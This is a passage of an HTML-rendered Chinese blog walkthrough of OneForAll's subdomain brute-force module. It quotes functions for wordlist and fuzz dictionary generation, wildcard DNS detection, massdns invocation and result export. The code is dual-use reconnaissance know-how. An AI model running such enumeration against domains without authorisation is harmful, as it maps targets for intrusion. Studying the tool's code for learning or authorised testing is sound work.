class="hljs-subst">&#123;self.domain&#125;</span>&#x27;</span>)<br>                <span class="hljs-keyword">for</span> subdomain <span class="hljs-keyword">in</span> all_subdomains:<br>                    self.place = <span class="hljs-string">&#x27;*.&#x27;</span> + subdomain<br>                    <span class="hljs-comment"># 进行下一层子域爆破的限制条件</span><br>                    num = subdomain.count(<span class="hljs-string">&#x27;.&#x27;</span>) - self.domain.count(<span class="hljs-string">&#x27;.&#x27;</span>)<br>                    <span class="hljs-keyword">if</span> num == layer_num:<br>                        valid_subdomains = self.main(subdomain)<br>                        all_subdomains.extend(valid_subdomains)<br><br>        logger.log(<span class="hljs-string">&#x27;INFOR&#x27;</span>, <span class="hljs-string">f&#x27;Finished <span class="hljs-subst">&#123;self.source&#125;</span> module to brute <span class="hljs-subst">&#123;self.domain&#125;</span>&#x27;</span>)<br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> self.path:<br>            name = <span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;self.domain&#125;</span>_brute_result.<span class="hljs-subst">&#123;self.fmt&#125;</span>&#x27;</span><br>            self.path = settings.result_save_dir.joinpath(name)<br>        <span class="hljs-comment"># 数据库导出</span><br>        <span class="hljs-keyword">if</span> self.export:<br>            <span class="hljs-comment"># 跟进函数 </span><br>            export.export_data(self.domain,<br>                                alive=self.alive,<br>                                limit=<span class="hljs-string">&#x27;resolve&#x27;</span>,<br>                                path=self.path,<br>                                fmt=self.fmt)<br><br></code></pre></div></td></tr></table></figure><h3 id="1-2-1-init-dict-path"><a href="#1-2-1-init-dict-path" class="headerlink" title="1.2.1 init_dict_path"></a>1.2.1 init_dict_path</h3><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">init_dict_path</span>(<span class="hljs-params">self</span>):</span><br>    data_dir = settings.data_storage_dir<br>    <span class="hljs-comment"># 如果为空，则赋值为默认路径</span><br>    <span class="hljs-keyword">if</span> self.wordlist <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>        self.wordlist = settings.brute_wordlist_path <span class="hljs-keyword">or</span> data_dir.joinpath(<span class="hljs-string">&#x27;subnames.txt&#x27;</span>)<br>    <span class="hljs-keyword">if</span> self.recursive_nextlist <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>        self.recursive_nextlist = settings.recursive_nextlist_path <span class="hljs-keyword">or</span> data_dir.joinpath(<span class="hljs-string">&#x27;subnames_next.txt&#x27;</span>)<br></code></pre></div></td></tr></table></figure><h3 id="1-2-2-check-brute-params"><a href="#1-2-2-check-brute-params" class="headerlink" title="1.2.2 check_brute_params"></a>1.2.2 check_brute_params</h3><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">check_brute_params</span>(<span class="hljs-params">self</span>):</span><br>    <span class="hljs-comment"># 判断是否爆破</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> (self.word <span class="hljs-keyword">or</span> self.fuzz):<br>        logger.log(<span class="hljs-string">&#x27;FATAL&#x27;</span>, <span class="hljs-string">f&#x27;Please specify at least one brute mode&#x27;</span>)<br>        exit(<span class="hljs-number">1</span>)<br>    <span class="hljs-comment"># 如果domains大于1 设置bulk</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(self.domains) &gt; <span class="hljs-number">1</span>:<br>        self.bulk = <span class="hljs-literal">True</span><br>    <span class="hljs-comment"># 如果设置的是自己的模糊爆破</span><br>    <span class="hljs-keyword">if</span> self.fuzz:<br>        <span class="hljs-keyword">if</span> self.place <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>            logger.log(<span class="hljs-string">&#x27;FATAL&#x27;</span>, <span class="hljs-string">f&#x27;No fuzz position specified&#x27;</span>)<br>            exit(<span class="hljs-number">1</span>)<br>        <span class="hljs-keyword">if</span> self.rule <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span> <span class="hljs-keyword">and</span> self.fuzzlist <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>            logger.log(<span class="hljs-string">&#x27;FATAL&#x27;</span>, <span class="hljs-string">f&#x27;No fuzz rules or fuzz dictionary specified&#x27;</span>)<br>            exit(<span class="hljs-number">1</span>)<br>        <span class="hljs-keyword">if</span> self.bulk:<br>            logger.log(<span class="hljs-string">&#x27;FATAL&#x27;</span>, <span class="hljs-string">f&#x27;Cannot use fuzz mode in the bulk brute&#x27;</span>)<br>            exit(<span class="hljs-number">1</span>)<br>        <span class="hljs-keyword">if</span> self.recursive_brute:<br>            logger.log(<span class="hljs-string">&#x27;FATAL&#x27;</span>, <span class="hljs-string">f&#x27;Cannot use recursive brute in fuzz mode&#x27;</span>)<br>            exit(<span class="hljs-number">1</span>)<br>        fuzz_count = self.place.count(<span class="hljs-string">&#x27;*&#x27;</span>)<br>        <span class="hljs-keyword">if</span> fuzz_count &lt; <span class="hljs-number">1</span>:<br>            logger.log(<span class="hljs-string">&#x27;FATAL&#x27;</span>, <span class="hljs-string">f&#x27;No fuzz position specified&#x27;</span>)<br>            exit(<span class="hljs-number">1</span>)<br>        <span class="hljs-keyword">if</span> fuzz_count &gt; <span class="hljs-number">1</span>:<br>            logger.log(<span class="hljs-string">&#x27;FATAL&#x27;</span>, <span class="hljs-string">f&#x27;Only one fuzz position can be specified&#x27;</span>)<br>            exit(<span class="hljs-number">1</span>)<br>        <span class="hljs-keyword">if</span> self.domain <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> self.place:<br>            logger.log(<span class="hljs-string">&#x27;FATAL&#x27;</span>, <span class="hljs-string">f&#x27;Incorrect domain for fuzz&#x27;</span>)<br>            exit(<span class="hljs-number">1</span>)<br></code></pre></div></td></tr></table></figure><h3 id="1-2-3-export-data"><a href="#1-2-3-export-data" class="headerlink" title="1.2.3 export_data"></a>1.2.3 export_data</h3><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">export_data</span>(<span class="hljs-params">target, db=<span class="hljs-literal">None</span>, alive=<span class="hljs-literal">False</span>, limit=<span class="hljs-literal">None</span>, path=<span class="hljs-literal">None</span>, fmt=<span class="hljs-string">&#x27;csv&#x27;</span>, show=<span class="hljs-literal">False</span></span>):</span><br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    OneForAll export from database module</span><br><span class="hljs-string"></span><br><span class="hljs-string">    Example:</span><br><span class="hljs-string">        python3 export.py --target name --fmt csv --dir= ./result.csv</span><br><span class="hljs-string">        python3 export.py --target name --tb True --show False</span><br><span class="hljs-string">        python3 export.py --db result.db --target name --show False</span><br><span class="hljs-string"></span><br><span class="hljs-string">    Note:</span><br><span class="hljs-string">        --fmt csv/json (result format)</span><br><span class="hljs-string">        --path   Result directory (default directory is ./results)</span><br><span class="hljs-string"></span><br><span class="hljs-string">    :param str  target:  Table to be exported</span><br><span class="hljs-string">    :param str  db:      Database path to be exported (default ./results/result.sqlite3)</span><br><span class="hljs-string">    :param bool alive:   Only export the results of alive subdomains (default False)</span><br><span class="hljs-string">    :param str  limit:   Export limit (default None)</span><br><span class="hljs-string">    :param str  fmt:     Result format (default csv)</span><br><span class="hljs-string">    :param str  path:    Result directory (default None)</span><br><span class="hljs-string">    :param bool show:    Displays the exported data in terminal (default False)</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    <span class="hljs-comment"># 获得连接后的对象</span><br>    database = Database(db)<br>    <span class="hljs-comment"># 获得规范化之后的目标队列</span><br>    domains = utils.get_domains(target)<br>    datas = <span class="hljs-built_in">list</span>()<br>    <span class="hljs-keyword">if</span> domains:<br>        <span class="hljs-keyword">for</span> domain <span class="hljs-keyword">in</span> domains:<br>            table_name = domain.replace(<span class="hljs-string">&#x27;.&#x27;</span>, <span class="hljs-string">&#x27;_&#x27;</span>)<br>            <span class="hljs-comment"># 跟进函数 返回查询到的sql语句</span><br>            rows = database.export_data(table_name, alive, limit)<br>            <span class="hljs-keyword">if</span> rows <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>                <span class="hljs-keyword">continue</span><br>            <span class="hljs-comment"># </span><br>            data, _, _ = do_export(fmt, path, rows, show, domain, target)<br>            datas.extend(data)<br>    database.close()<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(domains) &gt; <span class="hljs-number">1</span>:<br>        utils.export_all(alive, fmt, path, datas)<br>    <span class="hljs-keyword">return</span> datas<br></code></pre></div></td></tr></table></figure><h4 id="1-2-3-1-export-data"><a href="#1-2-3-1-export-data" class="headerlink" title="1.2.3.1 export_data"></a>1.2.3.1 export_data</h4><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">export_data</span>(<span class="hljs-params">self, table_name, alive, limit</span>):</span><br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    Get part of the data in the table</span><br><span class="hljs-string"></span><br><span class="hljs-string">    :param str table_name: table name</span><br><span class="hljs-string">    :param any alive: alive flag</span><br><span class="hljs-string">    :param str limit: limit value</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    table_name = table_name.replace(<span class="hljs-string">&#x27;.&#x27;</span>, <span class="hljs-string">&#x27;_&#x27;</span>)<br>    <span class="hljs-comment"># 构造sql语句</span><br>    sql = <span class="hljs-string">f&#x27;select id, alive, request, resolve, url, subdomain, level,&#x27;</span> \<br>            <span class="hljs-string">f&#x27;cname, ip, public, cdn, port, status, reason, title, banner,&#x27;</span> \<br>            <span class="hljs-string">f&#x27;cidr, asn, org, addr, isp, source from &quot;<span class="hljs-subst">&#123;table_name&#125;</span>&quot; &#x27;</span><br>    <span class="hljs-comment"># 如果有limit则按照对应的构建sql语句</span><br>    <span class="hljs-keyword">if</span> alive <span class="hljs-keyword">and</span> limit:<br>        <span class="hljs-keyword">if</span> limit <span class="hljs-keyword">in</span> [<span class="hljs-string">&#x27;resolve&#x27;</span>, <span class="hljs-string">&#x27;request&#x27;</span>]:<br>            where = <span class="hljs-string">f&#x27; where <span class="hljs-subst">&#123;limit&#125;</span> = 1&#x27;</span><br>            sql += where<br>    <span class="hljs-keyword">elif</span> alive:<br>        where = <span class="hljs-string">f&#x27; where alive = 1&#x27;</span><br>        sql += where<br>    sql += <span class="hljs-string">&#x27; order by subdomain&#x27;</span><br>    logger.log(<span class="hljs-string">&#x27;TRACE&#x27;</span>, <span class="hljs-string">f&#x27;Get the data from <span class="hljs-subst">&#123;table_name&#125;</span> table&#x27;</span>)<br>    <span class="hljs-comment"># 返回查询的sql语句</span><br>    <span class="hljs-keyword">return</span> self.query(sql)<br></code></pre></div></td></tr></table></figure><h4 id="1-2-3-2-do-export"><a href="#1-2-3-2-do-export" class="headerlink" title="1.2.3.2 do_export"></a>1.2.3.2 do_export</h4><p>将具体的导出过程作为应该模块进行分析，承接此处分析</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">do_export</span>(<span class="hljs-params">fmt, path, rows, show, domain, target</span>):</span><br>    fmt = utils.check_format(fmt)<br>    path = utils.check_path(path, target, fmt)<br>    <span class="hljs-keyword">if</span> show:<br>        <span class="hljs-built_in">print</span>(rows.dataset)<br>    <span class="hljs-comment"># 返回对应的数据</span><br>    data = rows.export(fmt)<br>    <span class="hljs-comment"># 此处已经将内容进行保存</span><br>    utils.save_to_file(path, data)<br>    logger.log(<span class="hljs-string">&#x27;ALERT&#x27;</span>, <span class="hljs-string">f&#x27;The subdomain result for <span class="hljs-subst">&#123;domain&#125;</span>: <span class="hljs-subst">&#123;path&#125;</span>&#x27;</span>)<br>    <span class="hljs-comment"># 将数据转换为字典形式</span><br>    data = rows.as_dict()<br>    <span class="hljs-keyword">return</span> data, fmt, path<br></code></pre></div></td></tr></table></figure><h2 id="1-3-main"><a href="#1-3-main" class="headerlink" title="1.3 main"></a>1.3 main</h2><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">main</span>(<span class="hljs-params">self, domain</span>):</span><br>    <span class="hljs-comment"># 获取开始时间</span><br>    start = time.time()<br>    logger.log(<span class="hljs-string">&#x27;INFOR&#x27;</span>, <span class="hljs-string">f&#x27;Blasting <span class="hljs-subst">&#123;domain&#125;</span> &#x27;</span>)<br>    <span class="hljs-comment"># 获得massdns的默认文件路径</span><br>    massdns_dir = settings.third_party_dir.joinpath(<span class="hljs-string">&#x27;massdns&#x27;</span>)<br>    <span class="hljs-comment"># 设置结果的输出目录</span><br>    result_dir = settings.result_save_dir<br>    <span class="hljs-comment"># 设置临时文件路径</span><br>    temp_dir = result_dir.joinpath(<span class="hljs-string">&#x27;temp&#x27;</span>)<br>    <span class="hljs-comment"># 判断目录是否存在，如果不存在则创建</span><br>    utils.check_dir(temp_dir)<br>    <span class="hljs-comment"># get_massdns_path默认为none</span><br>    massdns_path = utils.get_massdns_path(massdns_dir)<br>    <span class="hljs-comment"># 获取时间</span><br>    timestring = utils.get_timestring()<br><br>    wildcard_ips = <span class="hljs-built_in">list</span>()  <span class="hljs-comment"># 泛解析IP列表</span><br>    wildcard_ttl = <span class="hljs-built_in">int</span>()  <span class="hljs-comment"># 泛解析TTL整型值</span><br>    <span class="hljs-comment"># 获取dns中的ns信息</span><br>    ns_list = query_domain_ns(self.domain)<br>    ns_ip_list = query_domain_ns_a(ns_list)  <span class="hljs-comment"># DNS权威名称服务器对应A记录列表</span><br>    <span class="hljs-comment"># 判断是否是泛解析域名</span><br>    <span class="hljs-keyword">if</span> self.enable_wildcard <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>        self.enable_wildcard = wildcard.detect_wildcard(domain)<br>        <br>    <span class="hljs-comment"># 若是泛解析</span><br>    <span class="hljs-keyword">if</span> self.enable_wildcard:<br>        <span class="hljs-comment"># 返回多次尝试dns查询获得的IP地址和TTL列表</span><br>        wildcard_ips, wildcard_ttl = wildcard.collect_wildcard_record(domain, ns_ip_list)<br>    <span class="hljs-comment"># 跟进函数 返回路径</span><br>    ns_path = utils.get_ns_path(self.in_china, self.enable_wildcard, ns_ip_list)<br>    <span class="hljs-comment"># 跟进函数 返回生成的子域名列表</span><br>    dict_set = self.gen_brute_dict(domain)<br><br>    dict_name = <span class="hljs-string">f&#x27;generated_subdomains_<span class="hljs-subst">&#123;domain&#125;</span>_<span class="hljs-subst">&#123;timestring&#125;</span>.txt&#x27;</span><br>    dict_path = temp_dir.joinpath(dict_name)<br>    <span class="hljs-comment"># 保存内容到对应路径</span><br>    save_brute_dict(dict_path, dict_set)<br>    <span class="hljs-comment"># 处理数据</span><br>    <span class="hljs-keyword">del</span> dict_set<br>    gc.collect()<br><br>    output_name = <span class="hljs-string">f&#x27;resolved_result_<span class="hljs-subst">&#123;domain&#125;</span>_<span class="hljs-subst">&#123;timestring&#125;</span>.json&#x27;</span><br>    output_path = temp_dir.joinpath(output_name)<br>    log_path = result_dir.joinpath(<span class="hljs-string">&#x27;massdns.log&#x27;</span>)<br>    <span class="hljs-comment"># 检查配置</span><br>    check_dict()<br>    logger.log(<span class="hljs-string">&#x27;INFOR&#x27;</span>, <span class="hljs-string">f&#x27;Running massdns to brute subdomains&#x27;</span>)<br>    <span class="hljs-comment"># 跟进函数 </span><br>    utils.call_massdns(massdns_path, dict_path, ns_path, output_path,<br>                        log_path, quiet_mode=self.quite,<br>                        concurrent_num=self.concurrent_num)<br>    <span class="hljs-comment"># 跟进函数 返回ip地址和name</span><br>    appear_times = stat_appear_times(output_path)<br>    <span class="hljs-comment"># 跟进函数 </span><br>    self.infos, self.subdomains = deal_output(output_path, appear_times,<br>                                                wildcard_ips, wildcard_ttl)<br>    <span class="hljs-comment"># 删除对应文件</span><br>    delete_file(dict_path, output_path)<br>    end = time.time()<br>    self.elapse = <span class="hljs-built_in">round</span>(end - start, <span class="hljs-number">1</span>)<br>    logger.log(<span class="hljs-string">&#x27;ALERT&#x27;</span>, <span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;self.source&#125;</span> module takes <span class="hljs-subst">&#123;self.elapse&#125;</span> seconds, &#x27;</span><br>                        <span class="hljs-string">f&#x27;found <span class="hljs-subst">&#123;<span class="hljs-built_in">len</span>(self.subdomains)&#125;</span> subdomains of <span class="hljs-subst">&#123;domain&#125;</span>&#x27;</span>)<br>    logger.log(<span class="hljs-string">&#x27;DEBUG&#x27;</span>, <span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;self.source&#125;</span> module found subdomains of <span class="hljs-subst">&#123;domain&#125;</span>: &#x27;</span><br>                        <span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;self.subdomains&#125;</span>&#x27;</span>)<br>    <span class="hljs-comment"># 处理数据并存储到数据库中</span><br>    self.gen_result()<br>    self.save_db()<br>    <span class="hljs-keyword">return</span> self.subdomains<br></code></pre></div></td></tr></table></figure><h3 id="1-3-1-get-ns-path"><a href="#1-3-1-get-ns-path" class="headerlink" title="1.3.1 get_ns_path"></a>1.3.1 get_ns_path</h3><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get_ns_path</span>(<span class="hljs-params">in_china=<span class="hljs-literal">None</span>, enable_wildcard=<span class="hljs-literal">None</span>, ns_ip_list=<span class="hljs-literal">None</span></span>):</span><br>    <span class="hljs-comment"># 获得具体路径</span><br>    data_dir = settings.data_storage_dir<br>    path = data_dir.joinpath(<span class="hljs-string">&#x27;nameservers.txt&#x27;</span>)<br>    <span class="hljs-comment"># 如果在中国设置其他路径</span><br>    <span class="hljs-keyword">if</span> in_china:<br>        path = data_dir.joinpath(<span class="hljs-string">&#x27;nameservers_cn.txt&#x27;</span>)<br>    <span class="hljs-comment"># 如果不是泛解析返回路径</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> enable_wildcard:<br>        <span class="hljs-keyword">return</span> path<br>    <span class="hljs-comment"># 如果没有ns查询的任何内容</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> ns_ip_list:<br>        <span class="hljs-keyword">return</span> path<br>    <span class="hljs-comment"># 设置路径</span><br>    path = settings.authoritative_dns_path<br>    <span class="hljs-comment"># 将内容保存到文件</span><br>    ns_data = <span class="hljs-string">&#x27;\n&#x27;</span>.join(ns_ip_list)<br>    save_to_file(path, ns_data)<br>    <span class="hljs-keyword">return</span> path<br></code></pre></div></td></tr></table></figure><h3 id="1-3-2-gen-brute-dict"><a href="#1-3-2-gen-brute-dict" class="headerlink" title="1.3.2 gen_brute_dict"></a>1.3.2 gen_brute_dict</h3><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">gen_brute_dict</span>(<span class="hljs-params">self, domain</span>):</span><br>    logger.log(<span class="hljs-string">&#x27;INFOR&#x27;</span>, <span class="hljs-string">f&#x27;Generating dictionary for <span class="hljs-subst">&#123;domain&#125;</span>&#x27;</span>)<br>    dict_set = <span class="hljs-built_in">set</span>()<br>    <span class="hljs-comment"># 如果domain不是self.subdomain 而是self.domain的子域则生成递归爆破字典</span><br>    <span class="hljs-keyword">if</span> self.word:<br>        self.place = <span class="hljs-string">&#x27;&#x27;</span><br>    <span class="hljs-comment"># 不存在place则生成对应 *.domain</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> self.place:<br>        self.place = <span class="hljs-string">&#x27;*.&#x27;</span> + domain<br>    wordlist = self.wordlist<br>    <span class="hljs-comment"># 获得标准格式的域名</span><br>    main_domain = utils.get_main_domain(domain)<br>    <span class="hljs-comment"># 如果传入的domain和格式后的main_domain不同</span><br>    <span class="hljs-keyword">if</span> domain != main_domain:<br>        <span class="hljs-comment"># 获得字典路径</span><br>        wordlist = self.recursive_nextlist<br>    <span class="hljs-comment"># 如果是字典爆破</span><br>    <span class="hljs-keyword">if</span> self.word:<br>        <span class="hljs-comment"># 即获取对应的爆破子域名列表</span><br>        word_subdomains = gen_word_subdomains(self.place, wordlist)<br>        dict_set.update(word_subdomains)<br>    <span class="hljs-comment"># 如果是模糊爆破</span><br>    <span class="hljs-keyword">if</span> self.fuzz:<br>        <span class="hljs-comment"># 返回对应rule生成的子域名列表</span><br>        fuzz_subdomains = gen_fuzz_subdomains(self.place, self.rule, self.fuzzlist)<br>        dict_set.update(fuzz_subdomains)<br>    count = <span class="hljs-built_in">len</span>(dict_set)<br>    <span class="hljs-comment"># 判断生成的内容是否超过1kw</span><br>    logger.log(<span class="hljs-string">&#x27;INFOR&#x27;</span>, <span class="hljs-string">f&#x27;Dictionary size: <span class="hljs-subst">&#123;count&#125;</span>&#x27;</span>)<br>    <span class="hljs-keyword">if</span> count &gt; <span class="hljs-number">10000000</span>:<br>        logger.log(<span class="hljs-string">&#x27;ALERT&#x27;</span>, <span class="hljs-string">f&#x27;The generated dictionary is &#x27;</span><br>                            <span class="hljs-string">f&#x27;too large <span class="hljs-subst">&#123;count&#125;</span> &gt; 10000000&#x27;</span>)<br>    <span class="hljs-keyword">return</span> dict_set<br></code></pre></div></td></tr></table></figure><h3 id="1-3-3-call-massdns"><a href="#1-3-3-call-massdns" class="headerlink" title="1.3.3 call_massdns"></a>1.3.3 call_massdns</h3><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">call_massdns</span>(<span class="hljs-params">massdns_path, dict_path, ns_path, output_path, log_path,</span></span><br><span class="hljs-params"><span class="hljs-function">                 query_type=<span class="hljs-string">&#x27;A&#x27;</span>, process_num=<span class="hljs-number">1</span>, concurrent_num=<span class="hljs-number">10000</span>,</span></span><br><span class="hljs-params"><span class="hljs-function">                 quiet_mode=<span class="hljs-literal">False</span></span>):</span><br>    logger.log(<span class="hljs-string">&#x27;DEBUG&#x27;</span>, <span class="hljs-string">&#x27;Start running massdns&#x27;</span>)<br>    quiet = <span class="hljs-string">&#x27;&#x27;</span><br>    <span class="hljs-keyword">if</span> quiet_mode:<br>        quiet = <span class="hljs-string">&#x27;--quiet&#x27;</span><br>    status_format = settings.brute_status_format<br>    socket_num = settings.brute_socket_num<br>    resolve_num = settings.brute_resolve_num<br>    <span class="hljs-comment"># 此处调用设置好的\thirdparty\\massdns\\windows\\x64\\massdns.exe文件进行分析</span><br>    cmd = <span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;massdns_path&#125;</span> <span class="hljs-subst">&#123;quiet&#125;</span> --status-format <span class="hljs-subst">&#123;status_format&#125;</span> &#x27;</span> \<br>          <span class="hljs-string">f&#x27;--processes <span class="hljs-subst">&#123;process_num&#125;</span> --socket-count <span class="hljs-subst">&#123;socket_num&#125;</span> &#x27;</span> \<br>          <span class="hljs-string">f&#x27;--hashmap-size <span class="hljs-subst">&#123;concurrent_num&#125;</span> --resolvers <span class="hljs-subst">&#123;ns_path&#125;</span> &#x27;</span> \<br>          <span 